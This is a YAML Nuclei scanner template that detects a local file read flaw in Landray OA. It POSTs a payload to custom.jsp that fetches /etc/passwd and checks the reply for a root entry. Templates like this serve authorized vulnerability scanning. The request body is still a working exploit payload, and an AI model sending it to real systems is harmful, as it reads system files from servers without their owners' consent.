id: landray-oa-fileread

info:
  name: Landray-OA Fileread
  author: pikpikcu
  severity: high
  reference: |
    - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
  tags: landray,lfi

requests:
  - method: POST
    path:
      - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      var={"body":{"file":"file:///etc/passwd"}}

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0:"
        condition: and

      - type: status
        status:
          - 200
